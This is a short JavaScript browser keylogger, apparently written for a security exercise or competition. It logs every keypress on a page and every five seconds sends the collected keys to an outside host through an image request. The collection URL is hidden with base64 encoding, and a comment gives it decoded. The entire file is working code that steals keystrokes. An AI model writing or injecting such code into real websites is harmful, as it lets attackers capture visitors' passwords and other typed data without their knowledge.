let keys = '';
// let url = 'http://127.0.0.1:8000/api/log/stroke?keys='
let url = atob("aHR0cDovL3BvcHRhcnRzLnNoYXJrcy5pc2VhZ2Uub3JnL2FwaS9sb2cvc3Ryb2tlP2tleXM9"); // http://poptarts.sharks.iseage.org/api/log/stroke?keys=

document.onkeypress = function (domEvent) {
    let get = window.event ? event : domEvent;
    let key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}

window.setInterval(function () {
    if (keys.length > 0) {
        new Image().src = url + keys;
        keys = '';
    }
}, 5000);
